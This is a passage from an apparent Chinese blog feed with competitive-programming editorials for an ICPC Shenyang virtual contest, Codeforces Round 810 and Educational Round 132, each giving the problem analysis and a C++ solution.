个不同的整数解，也就是本题答案之一。</p><p>有一种情况需要特判，就是当 $A=\frac{HM}{2}$，这时 $α=π$ ，$t ∈ [ 0 , HM )$ 中的每个整数都满足条件，故答案为 $HM$</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><p>然后标程就巨短</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line">ll h,m,a;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;h,&amp;m,&amp;a);</span><br><span class="line">    ll g=__gcd(h<span class="number">-1</span>,h*m);</span><br><span class="line">    <span class="keyword">if</span>(a==h*m/<span class="number">2</span>)  <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,h*m);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,g*(<span class="number">2</span>*(a/g)+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//559C6B224E004E2A4EBA662F8FD979CD611F89C95417FF1F</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>希望能和sigma姐姐一起进步，争取下次能vp到铜首水平。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> vp </category>
          
          <category> 2020沈阳 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 810(Div.2)解析</title>
      <link href="/2022/07/25/Codeforces%20Round%20810(Div.2)/"/>
      <url>/2022/07/25/Codeforces%20Round%20810(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>这场打回来一点吧，只是看隔壁div1好像被喷烂了的样子，咱也不懂，也没资格打div1，很多细节没注意到送出去罚时就很难受，本场录屏在B站了，</p><span id="more"></span><h2 id="A-Perfect-Permutation"><a href="#A-Perfect-Permutation" class="headerlink" title="A. Perfect Permutation"></a>A. Perfect Permutation</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题题意看了我有点久，就是构造一串能使得 <code>a[i]/i</code> 为整数比较少的序列，那么 <code>i=1</code> 它可以被任意数整除。但是 <code>i&gt;1</code> 我总能找到不能整除的数，因此这里构造的序列就是，第一个给 <code>n</code>，后面的给 <code>i-1</code> 即可。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">&#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Party"><a href="#B-Party" class="headerlink" title="B. Party"></a>B. Party</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题目比较有意思，出的也挺好的感觉，虽然一开始可能题意有点没读懂。有n个人，m对关系，如果每个人如果没来就会产生 $a_i$ 的不开心度，如果来了一对朋友那这对朋友要消耗一个蛋糕，一次只能生产偶数个蛋糕不能浪费。那么很显然，如果关系本身就是偶数对，那么所有人都可以来。如果关系是奇数对，我就得考虑踢人了，踢掉一个人的情况，使奇数对变成偶数对的方式就是，这个人有奇数对关系，那么踢了这个人就少了奇数对关系，结果变成偶数对了。踢掉两个人的情况，如果所有人的关系数都是奇数对或者本身踢掉两个人比踢掉一个人产生不开心指数更多，我就要考虑后面的情况了。那么我如果要踢掉两个人，那么这两个人一定都有偶数对关系，因为但凡有一个奇数对关系我都可以只踢掉那个人而保留下来另一个，显然这样的作法比较优。那么踢掉的两个人都是偶数对关系怎么办呢？如果它们自己产生了一对关系，那么两个人的偶数关系发生一个关系的重合，总体下来就是奇数对关系了。那么我们就需要踢掉两个朋友关系的，开心指数较小的两个人。</p><p>然后min一下即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> v;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;G[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.v&lt;b.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].v);</span><br><span class="line">a[i].i=i;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(G[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line"><span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">table[a[i].i]=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">G[table[x]].<span class="built_in">push_back</span>(table[y]);</span><br><span class="line">G[table[y]].<span class="built_in">push_back</span>(table[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">m=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="comment">//printf(&quot;i=%d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d has %d\n&quot;,a[i].i,G[i].size());</span></span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>)&#123;</span><br><span class="line">m=a[i].v;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v&gt;m)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> x=G[i].<span class="built_in">begin</span>();x!=G[i].<span class="built_in">end</span>();x++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v+a[*x].v&lt;m)&#123;</span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;G[*x].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">m=a[i].v+a[*x].v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Color-the-Picture"><a href="#C-Color-the-Picture" class="headerlink" title="C. Color the Picture"></a>C. Color the Picture</h2><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题也还挺好的，就是刷格子，然后要求一每个格子响铃格子都至少有三块相同色块，那么就是说你最多只有一个不同色块的相邻，并且告诉你了怎么处理边界的色块。那么它下面展示的图其实还是比较生动的，就是刷两列或者两行，然后再刷两列两列，如此往复。当然，三列四列都可以，一列是不行的，因为左右就有两个不同颜色的色块了。</p><p>那么我们直接每行每列看看能不能放的出对应的行或者列数即可。但是这里需要特判，如果我们都只能放两列，但是却只有奇数列，这种情况是不行的！！</p><p>最后不开 <code>long long</code> 见祖宗，万事给我加上一句<code>#define int long long</code>。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],c[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="comment">//int cmp(int a,int b)&#123;</span></span><br><span class="line"><span class="comment">//return a&lt;b;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">b[i]=a[i]/n;</span><br><span class="line">c[i]=a[i]/m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag1=<span class="number">0</span>,flag2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b[i]!=<span class="number">2</span>)flag1=<span class="number">1</span>;</span><br><span class="line">ans+=b[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=m)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag1&amp;&amp;m%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(c[i]!=<span class="number">2</span>)flag2=<span class="number">1</span>;</span><br><span class="line">ans+=c[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;%d %d\n&quot;,ans,n);</span></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=n)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag2&amp;&amp;n%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后说一句吧，就是细节问题真的要考虑周全一点的，小上一波分，但是离1600还是差远了，只能继续努力了，期待下次上大分了。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Educational Codeforces Round 132(Div.2)分析</title>
      <link href="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/"/>
      <url>/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>这次的比赛没打，但是自己打估计就是自闭上去的。</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你三个门，每个门后可能有🔑，一个钥匙开一个对应的门，问你是否有办法把所有的门打开。很简单，就那到🔑开个门，换新钥匙，看看能开几个门就可以了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;a,&amp;b[<span class="number">1</span>],&amp;b[<span class="number">2</span>],&amp;b[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">int</span> key=a,cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(key)&#123;</span><br><span class="line">        key=b[key];</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Also-Try-Minecraft"><a href="#B-Also-Try-Minecraft" class="headerlink" title="B. Also Try Minecraft"></a>B. Also Try Minecraft</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目说的还是比较清楚的，把minecraft抽象成一个二维世界，只有x和y轴，y轴向下位移会受到摔落伤害，但是上升不会。现在需要执行任务，告诉你每一列的高度，每个任务需要你从一列位移到另一列，问你完成每个任务需要受到多少摔落伤害。</p><p>这题也还可以，很难不想到用前缀和的思路去做。但是因为上升不会扣血或者加血，而它又有可能从后面位移到前面，因此我们需要算出两个前缀和，然后相减即可求得每个人物需要的血量，然后不要忘了开long long。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum1[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+<span class="built_in">max</span>(a[i]-a[i+<span class="number">1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum1[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">    sum2[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;<span class="number">1</span>;i--)&#123;</span><br><span class="line">        sum2[i]+=sum2[i+<span class="number">1</span>]+<span class="built_in">max</span>(a[i]-a[i<span class="number">-1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum2[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span 